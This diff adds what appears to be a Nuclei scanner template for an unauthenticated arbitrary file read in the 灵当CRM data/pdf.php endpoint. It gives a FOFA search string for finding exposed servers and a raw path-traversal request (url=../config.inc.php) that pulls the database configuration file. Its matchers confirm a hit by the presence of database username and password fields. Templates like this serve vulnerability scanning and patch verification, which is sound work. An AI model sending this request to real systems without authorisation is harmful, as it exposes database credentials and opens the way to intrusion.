@@ -1,0 +1,40 @@
+id: lingdangCRM-pdf_php-File-reading
+
+info:
+  name: "灵当CRM data 接口任意文件读取"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")
+    灵当CRM系统中的data/pdf.php接口存在任意文件读取安全缺陷。攻击者无需身份验证即可通过构造特定请求访问受限文件资源，包括但不限于数据库连接配置文件、系统敏感配置文件等关键数据。该漏洞可能引发系统信息泄露、配置篡改等严重安全风险，建议及时采取防护措施。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488712&idx=1&sn=b1c5a1987b44456cca5ec50b38b331e5&chksm=c267a1fbf51028edce259e6d075e2dd1438ca45a468d195196b71f9634e6f03f3b66cdf40225&token=555018471&lang=zh_CN#rd
+  tags: 灵当CRM
+
+
+
+http:
+- raw:
+  - |
+    GET /crm/data/pdf.php?url=../config.inc.php HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'db_server'
+    - 'db_username'
+    - 'db_password'
+    - 'db_name'
+    condition: and
+  - type: status
+    status:
+    - 200
+
+
+
+
+
